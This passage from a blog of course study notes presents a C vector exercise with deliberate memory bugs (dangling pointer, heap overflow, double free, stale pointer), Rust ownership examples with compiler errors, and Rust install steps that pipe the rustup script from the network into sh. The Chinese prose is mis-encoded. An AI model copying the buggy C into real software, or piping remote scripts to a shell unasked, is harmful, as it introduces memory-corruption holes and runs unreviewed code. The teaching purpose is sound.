class="hljs-comment">// Vec is short for &quot;vector&quot;, a common term for a resizable array.</span><br><span class="hljs-comment">// For simplicity, our vector type can only hold ints.</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span>* data;     <span class="hljs-comment">// Pointer to our array on the heap</span><br>  <span class="hljs-type">int</span>  length;   <span class="hljs-comment">// How many elements are in our array</span><br>  <span class="hljs-type">int</span>  capacity; <span class="hljs-comment">// How many elements our array can hold</span><br>&#125; Vec;<br><br>Vec* <span class="hljs-title function_">vec_new</span><span class="hljs-params">()</span> &#123;<br>  Vec vec;<br>  vec.data = <span class="hljs-literal">NULL</span>;<br>  vec.length = <span class="hljs-number">0</span>;<br>  vec.capacity = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> &amp;vec;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vec_push</span><span class="hljs-params">(Vec* vec, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-keyword">if</span> (vec-&gt;length == vec-&gt;capacity) &#123;<br>    <span class="hljs-type">int</span> new_capacity = vec-&gt;capacity * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span>* new_data = (<span class="hljs-type">int</span>*) <span class="hljs-built_in">malloc</span>(new_capacity);<br>    assert(new_data != <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec-&gt;length; ++i) &#123;<br>      new_data[i] = vec-&gt;data[i];<br>    &#125;<br><br>    vec-&gt;data = new_data;<br>    vec-&gt;capacity = new_capacity;<br>  &#125;<br><br>  vec-&gt;data[vec-&gt;length] = n;<br>  ++vec-&gt;length;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vec_free</span><span class="hljs-params">(Vec* vec)</span> &#123;<br>  <span class="hljs-built_in">free</span>(vec);<br>  <span class="hljs-built_in">free</span>(vec-&gt;data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  Vec* vec = vec_new();<br>  vec_push(vec, <span class="hljs-number">107</span>);<br><br>  <span class="hljs-type">int</span>* n = &amp;vec-&gt;data[<span class="hljs-number">0</span>];<br>  vec_push(vec, <span class="hljs-number">110</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *n);<br><br>  <span class="hljs-built_in">free</span>(vec-&gt;data);<br>  vec_free(vec);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Answer"><a class="header-anchor" href="#Answer">Â¶</a>Answer</h3><ul><li><p><strong>1.</strong><code>vec_new()</code> è¿”å›çš„ &amp;vec æ˜¯å±€éƒ¨å˜é‡åœ°å€ï¼Œæ˜¯ <code>Dangling Pointer</code>ï¼Œä½†å®é™…è°ƒè¯•å‘ç°æ˜¯ 0 ï¼ˆï¼Ÿï¼‰ã€‚ä¸æ‡‚ï¼ŒæŠŠ vec æ”¹æˆå…¨å±€å˜é‡åç»§ç»­è°ƒè¯•.jpg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Vec* <span class="hljs-title function_">vec_new</span><span class="hljs-params">()</span> &#123;<br>  Vec vec;<br>  vec.data = <span class="hljs-literal">NULL</span>;<br>  vec.length = <span class="hljs-number">0</span>;<br>  vec.capacity = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> &amp;vec;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>2.</strong><code>vec_push()</code> ä¸­çš„ <code>vec-&gt;capacity</code> ä¸€ç›´æ˜¯ 0ï¼Œå¯¼è‡´ <code>Heap Overflow</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vec_push</span><span class="hljs-params">(Vec* vec, <span class="hljs-type">int</span> n)</span> &#123;<br>  <span class="hljs-keyword">if</span> (vec-&gt;length == vec-&gt;capacity) &#123;<br>    <span class="hljs-type">int</span> new_capacity = vec-&gt;capacity * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span>* new_data = (<span class="hljs-type">int</span>*) <span class="hljs-built_in">malloc</span>(new_capacity);<br>    assert(new_data != <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec-&gt;length; ++i) &#123;<br>      new_data[i] = vec-&gt;data[i];<br>    &#125;<br><br>    vec-&gt;data = new_data;<br>    vec-&gt;capacity = new_capacity;<br>  &#125;<br><br>  vec-&gt;data[vec-&gt;length] = n;<br>  ++vec-&gt;length;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>3.</strong><code>main()</code> ä¸­ <code>free(data)</code> åè°ƒç”¨ <code>vec_free(vec)</code> ï¼Œå¯¼è‡´ <code>Double Free</code>ã€‚</p><p><strong>4.</strong><code>int* n = &amp;vec-&gt;data[0];</code> æŒ‡é’ˆ n æŒ‡å‘ resize å‰çš„ <code>vec-&gt;data</code> åŒºåŸŸ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  Vec* vec = vec_new();<br>  vec_push(vec, <span class="hljs-number">107</span>);<br><br>  <span class="hljs-type">int</span>* n = &amp;vec-&gt;data[<span class="hljs-number">0</span>];<br>  vec_push(vec, <span class="hljs-number">110</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *n);<br><br>  <span class="hljs-built_in">free</span>(vec-&gt;data);<br>  vec_free(vec);<br>&#125;<br></code></pre></td></tr></table></figure><p>ğŸ‘´ğŸ»ğŸ‘‹ğŸ»ä¼šäº†ï¼ŒğŸ‘´ğŸ»æ˜¯èœç‹—</p></li></ul><h2 id="Rust-çš„ä¸€äº›ç‰¹ç‚¹"><a class="header-anchor" href="#Rust-çš„ä¸€äº›ç‰¹ç‚¹">Â¶</a>Rust çš„ä¸€äº›ç‰¹ç‚¹</h2><ul><li>ä¸ºäº†ä½¿ç¨‹åºç›¸å¯¹å®‰å…¨ï¼Œæˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™ä¼šå—åˆ° rust è®¾ç«‹çš„ä¸€äº›é™åˆ¶ï¼Œå¯¼è‡´æœ‰äº›ç¨‹åºå†™èµ·æ¥éå¸¸å›°éš¾ç”šè‡³éš¾ä»¥å®ç°</li><li>rust çš„å®‰å…¨ä¿éšœå¤§å¤šæ¥è‡ªç¼–è¯‘å™¨çš„æ£€æŸ¥</li><li>rust çš„ç¼–è¯‘å™¨ä¼˜åŒ–æœ‰æ—¶ä¼šè®©ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºæ€§èƒ½ç”šè‡³ä¼˜äº C</li></ul><h2 id="Rust-ä¸­çš„-OwnerShip-Rules"><a class="header-anchor" href="#Rust-ä¸­çš„-OwnerShip-Rules">Â¶</a>Rust ä¸­çš„ OwnerShip Rules</h2><ul><li>Rust ä¸­çš„æ‰€æœ‰å€¼éƒ½æœ‰è‡ªå·±çš„ owner å˜é‡</li><li>ä¸€ä¸ªå€¼åŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ª owner</li><li>å½“ owner (å˜é‡)ç¦»å¼€ä½œç”¨åŸŸèŒƒå›´æ—¶ï¼Œè¿™ä¸ªå€¼å°†è¢«ä¸¢å¼ƒ(drop)</li></ul><h2 id="ä¸Šä¸‹æ–‡ä¸­çš„-OwnerShip"><a class="header-anchor" href="#ä¸Šä¸‹æ–‡ä¸­çš„-OwnerShip">Â¶</a>ä¸Šä¸‹æ–‡ä¸­çš„ OwnerShip</h2><p><a href="https://play.rust-lang.org/">Rust Playground</a></p><h3 id="String"><a class="header-anchor" href="#String">Â¶</a>String</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">u</span> = s;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s);<span class="hljs-comment">// println!(&quot;&#123;&#125;&quot;,u) compiles just fine!</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æŠ¥é”™å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust">warning: unused variable: `u`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">3</span>:<span class="hljs-number">9</span><br>  |<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">u</span> = s;<br>  |         ^ help: <span class="hljs-keyword">if</span> this is intentional, prefix it with an underscore: `_u`<br>  |<br>  = note: `<span class="hljs-meta">#[warn(unused_variables)]</span>` on by default<br><br>error[E0382]: borrow of moved value: `s`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">4</span>:<span class="hljs-number">20</span><br>  |<br><span class="hljs-number">2</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>  |         - <span class="hljs-keyword">move</span> occurs because `s` has <span class="hljs-keyword">type</span> `<span class="hljs-type">String</span>`, which does not implement the `<span class="hljs-built_in">Copy</span>` <span class="hljs-keyword">trait</span><br><span class="hljs-number">3</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">u</span> = s;<br>  |             - value moved here<br><span class="hljs-number">4</span> |     <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, s);    <span class="hljs-comment">// println!(&quot;&#123;&#125;&quot;,u) compiles just fine!</span><br>  |                    ^ value borrowed here after <span class="hljs-keyword">move</span><br>  |<br>  = note: this error originates <span class="hljs-keyword">in</span> the <span class="hljs-keyword">macro</span> `$crate::format_args_nl` which comes from the expansion of the <span class="hljs-keyword">macro</span> `println` (<span class="hljs-keyword">in</span> Nightly builds, run with -Z <span class="hljs-keyword">macro</span>-backtrace <span class="hljs-keyword">for</span> <span class="hljs-variable">more</span> <span class="hljs-keyword">in</span>fo)<br></code></pre></td></tr></table></figure><p><code>let u = s</code> è¿‡ç¨‹ä¸­å‘ç”Ÿäº† String çš„æ‰€æœ‰æƒä¼ é€’ï¼Œè€Œ String æ²¡æœ‰å®ç° <code>Copy</code> traitï¼ˆå…·æœ‰ <code>Copy</code> trait çš„å˜é‡èµ‹å€¼æ‰€æœ‰æƒä¸æ˜¯è½¬ç§»è€Œæ˜¯å¤åˆ¶ï¼‰ï¼Œs æ­¤æ—¶ä¸å†å…·æœ‰è¯¥ String çš„ Ownershipï¼ŒæŠ¥é”™ã€‚</p><h3 id="function"><a class="header-anchor" href="#function">Â¶</a>function</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">om_nom_nom</span>(s: <span class="hljs-type">String</span>)&#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;I have consumed &#123;&#125;&quot;</span>,s);<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>    <span class="hljs-title function_ invoke__">om_nom_nom</span>(s);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,s);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs rust">error[E0382]: borrow of moved value: `s`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">8</span>:<span class="hljs-number">19</span><br>  |<br><span class="hljs-number">6</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-string">&quot;im a lil string&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>();<br>  |         - <span class="hljs-keyword">move</span> occurs because `s` has <span class="hljs-keyword">type</span> `<span class="hljs-type">String</span>`, which does not implement the `<span class="hljs-built_in">Copy</span>` <span class="hljs-keyword">trait</span><br><span class="hljs-number">7</span> |     <span class="hljs-title function_ invoke__">om_nom_nom</span>(s);<br>  |                - value moved here<br><span class="hljs-number">8</span> |     <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,s);<br>  |                   ^ value borrowed here after <span class="hljs-keyword">move</span><br>  |<br>  = note: this error originates <span class="hljs-keyword">in</span> the <span class="hljs-keyword">macro</span> `$crate::format_args_nl` which comes from the expansion of the <span class="hljs-keyword">macro</span> `println` (<span class="hljs-keyword">in</span> Nightly builds, run with -Z <span class="hljs-keyword">macro</span>-backtrace <span class="hljs-keyword">for</span> <span class="hljs-variable">more</span> <span class="hljs-keyword">in</span>fo)<br><br></code></pre></td></tr></table></figure><p><code>om_nom_nom(s)</code> å‘ç”Ÿäº† String çš„æ‰€æœ‰æƒä¼ é€’ï¼Œs æ­¤æ—¶ä¸å†å…·æœ‰è¯¥ String çš„ Ownershipï¼ŒæŠ¥é”™ã€‚</p><h3 id="u32"><a class="header-anchor" href="#u32">Â¶</a>u32</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">om_nom_nom</span>(n: <span class="hljs-type">u32</span>)&#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125; is a very nice number&quot;</span>,n);<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">n</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">110</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">m</span> = n;<br>    <span class="hljs-title function_ invoke__">om_nom_nom</span>(m);<br>    <span class="hljs-title function_ invoke__">om_nom_nom</span>(n);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,m+n);<br>&#125;<br></code></pre></td></tr></table></figure><p>u32 å…·æœ‰ <code>Copy</code> traitï¼Œæ‰€æœ‰æƒå‘ç”Ÿäº†å¤åˆ¶è€Œä¸æ˜¯ä¼ é€’ï¼Œç¨‹åºæ­£å¸¸è¿è¡Œã€‚</p><h2 id="æ›´å¤šæœ‰å…³-OwnerShip"><a class="header-anchor" href="#æ›´å¤šæœ‰å…³-OwnerShip">Â¶</a>æ›´å¤šæœ‰å…³ OwnerShip</h2><ul><li><a href="https://course.rs/basic/ownership/index.html">æ‰€æœ‰æƒä¸å€Ÿç”¨</a></li></ul><h1>Week 1 Exercises: Hello world</h1><h2 id="Purpose"><a class="header-anchor" href="#Purpose">Â¶</a>Purpose</h2><ul><li>å®‰è£…å¥½ rust ç¯å¢ƒï¼Œä»ä»£ç ç¼–è¯‘è¿è¡Œ rust ç¨‹åº</li><li>ç†Ÿæ‚‰ rust åŸºæœ¬è¯­æ³•</li></ul><h2 id="Part-1-Getting-oriented"><a class="header-anchor" href="#Part-1-Getting-oriented">Â¶</a>Part 1: Getting oriented</h2><p>æŒ‰ç…§ <a href="https://www.rust-lang.org/tools/install">å®˜æ–¹</a> ç»™å‡ºçš„å®‰è£…å»ºè®®ï¼Œæˆ‘æ˜¯ wsl2 å°±ä½¿ç”¨çš„ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --proto <span class="hljs-string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh<br></code></pre></td></tr></table></figure><p>å…¶å® UNIX ç³»ç»Ÿåº”è¯¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤å°±éƒ½èƒ½å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://sh.rustup.rs -sSf | sh<br></code></pre></td></tr></table></figure><p>è£…å¥½å<strong>å¼€ä¸ªæ–°çš„ shell æ¥åŠ è½½ä¸‹ç¯å¢ƒå˜é‡</strong>å°± okã€‚</p><p>ç„¶å git clone ç»™çš„ä»“åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/reberhardt7/cs110l-spr-2020-starter-code.git<br></code></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶å¤¹ä¸‹è¿è¡Œ <code>cargo build</code> å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ ./target/debug/hello-world<br>Hello, world!<br></code></pre></td></tr></table></figure><p>æ›´æ”¹ä¸‹æ–‡ä»¶å†…å®¹ï¼Œ<code>cargo run</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Goodbye,World!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ cargo run<br>   Compiling hello-world v0.1.0 (path/cs110l-spr-2020-starter-code/week1/part-1-hello-world)<br>    Finished dev [unoptimized + debuginfo] target(s) <span class="hljs-keyword">in</span> 0.29s<br>     Running `target/debug/hello-world`<br>Goodbye,World!<br></code></pre></td></tr></table></figure><p>å†æˆ–è€…ç”¨ <code>rustc</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">â¯ rustc main.rs<br>â¯ ll<br>total 3.9M<br>-rwxr-xr-x 1 nightu nightu 3.9M Nov  4 22:13 main<br>-rw-r--r-- 1 nightu nightu   46 Nov  4 21:59 main.rs<br>â¯ ./main<br>Goodbye,World!<br></code></pre></td></tr></table></figure><h2 id="Part-2-Rust-warmup"><a class="header-anchor" href="#Part-2-Rust-warmup">Â¶</a>Part 2: Rust warmup</h2><h3 id="Syntax"><a class="header-anchor" href="#Syntax">Â¶</a>Syntax</h3><p>æ•°å­—ç±»å‹: æœ‰ç¬¦å·çš„ <code>i8, i16, i32, i64</code>ï¼Œæ— ç¬¦å·çš„ <code>u8, u16, u32, u64</code>ã€‚æŒºå¥½è®°çš„ XDï¼Œæ•°å­—å°±æ˜¯ä½æ•°ï¼ˆbit ä½ï¼‰çš„æ„æ€ã€‚</p><p>å£°æ˜å˜é‡çš„è¯ï¼Œç”¨ <code>let</code> å…³é”®å­—ï¼Œå¹¶è¡¨æ˜å˜é‡ç±»å‹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Declare a variable containing a signed 32-bit number. (Equivalent to</span><br><span class="hljs-comment">// &quot;int n = 1&quot; in C)</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">n</span>: <span class="hljs-type">i32</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶ï¼ŒRust æœ‰ä¸ªç‰¹æ€§å« <em>type inference</em>ã€‚å½“ rust å¯ä»¥æ¨æ–­å‡ºä½ æ‰€å†™çš„å˜é‡ç±»å‹çš„æ—¶å€™ï¼Œä½ å¯ä»¥çœç•¥å˜é‡ç±»å‹è¿›è¡Œå˜é‡å£°æ˜ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">n</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ¶‰åŠåˆ°æ— ç¬¦å·æ•´æ•°æ—¶éœ€è¦æ‰‹åŠ¨æŒ‡å®šï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">n1</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">n2</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">0xcafebabe</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-string">&quot;nightu&quot;</span>;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;0&#125; and &#123;2&#125; &#123;1&#125;&quot;</span>,s1,n2,n1);<br>    <span class="hljs-comment">// 0, 2, 1 are the index of the following args</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ç„¶ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust">error: literal out of range <span class="hljs-keyword">for</span> `<span class="hljs-type">i32</span>`<br> -<span class="hljs-punctuation">-&gt;</span> src/main.rs:<span class="hljs-number">3</span>:<span class="hljs-number">14</span><br>  |<br><span class="hljs-number">3</span> |     <span class="hljs-keyword">let</span> <span class="hljs-variable">n2</span> = <span class="hljs-number">0xcafebabe</span>;<br>  |              ^^^^^^^^^^<br>  |<br>  = note: `<span class="hljs-meta">#[deny(overflowing_literals)]</span>` on by default<br>  = note: the literal `<span class="hljs-number">0xcafebabe</span>` (decimal `<span class="hljs-number">3405691582</span>`) does not fit into the <span class="hljs-keyword">type</span> `<span class="hljs-type">i32</span>` and will <span class="hljs-keyword">become</span> `-<span class="hljs-number">889275714i32</span>`<br>  = help: consider using the <span class="hljs-keyword">type</span> `<span class="hljs-type">u32</span>` instead<br></code></pre></td></tr></table></figure><p>ä¸å¤§å¤šæ•°è¯­è¨€ä¸åŒï¼Œ<strong>Rust çš„å˜é‡é»˜è®¤æ˜¯å¸¸é‡</strong>ã€‚æ·»åŠ  <code>mut</code> å…³é”®å­—ä½¿å˜é‡å¯å˜ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">n</span> = <span class="hljs-number">0</span>;<br>n = n + <span class="hljs-number">1</span>;  <span class="hljs-comment">// compiles fine</span><br></code></pre></td></tr></table></figure><p>Rust çš„å­—ç¬¦ä¸²æœ‰ä¸¤ç§ç±»å‹ï¼Œ<code>&amp;str</code> è¡¨ç¤ºæŒ‡å‘å†…å­˜ä¸­æŸå¤„ä¸å¯å˜çš„å­—ç¬¦ä¸²å¸¸é‡ï¼Œ<code>String</code> å‚¨å­˜ä¸€ä¸ªå †ä¸Šçš„å­—ç¬¦ä¸²ï¼Œåœ¨åŠ äº† <code>mut</code> çš„æƒ…å†µä¸‹å¯ä»¥è¿›è¡Œæ›´æ”¹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">let s: &amp;str = <span class="hljs-string">&quot;Hello world&quot;</span>;    <span class="hljs-regexp">//</span> the <span class="hljs-string">&quot;: &amp;str&quot;</span> annotation is optional<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ <code>&amp;str</code> æƒ…å½¢ï¼Œè¿™é‡Œçš„ s æ˜¯åªè¯»æŒ‡é’ˆï¼Œ<code>&quot;Hello world&quot;</code> å­—ç¬¦ä¸²å‚¨å­˜çš„æ•°æ®æ®µä¹Ÿæ˜¯åªè¯»æƒé™ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;Hello &quot;</span>); <span class="hljs-comment">// &quot;String&quot; type annotation is optional</span><br>s.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">&quot;world!&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢åˆ™æ˜¯ <code>String</code> æƒ…å½¢ï¼Œå¯ä»¥åœ¨åé¢å¢åŠ å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€è¡Œåœ¨å †ä¸Šåˆ†é…å‚¨å­˜å­—ç¬¦ä¸²çš„å†…å­˜ï¼Œåœ°å€è¿”å›ç»™ s æŒ‡é’ˆï¼Œç¬¬äºŒè¡ŒæŠŠå­—ç¬¦ä¸²é™„åŠ åˆ°åˆ†é…çš„å†…å­˜ï¼Œå¿…è¦æ—¶è°ƒæ•´ä½ç½®/å †å—å¤§å°ã€‚å­—ç¬¦ä¸²å¼€è¾Ÿçš„å†…å­˜ä¼šåœ¨è¯¥å­—ç¬¦ä¸²è¢«ä½¿ç”¨çš„æœ€åä¸€è¡Œåè¢«é‡Šæ”¾ã€‚</p><p>ä½¿ç”¨å‘é‡æ˜¯å­˜å‚¨ä¸€ç³»åˆ—çš„äº‹ç‰©æœ€ç®€å•çš„æ–¹æ³•ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">v</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>v.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">2</span>);<br>v.<span class="hljs-title function_ invoke__">push</span>(<span 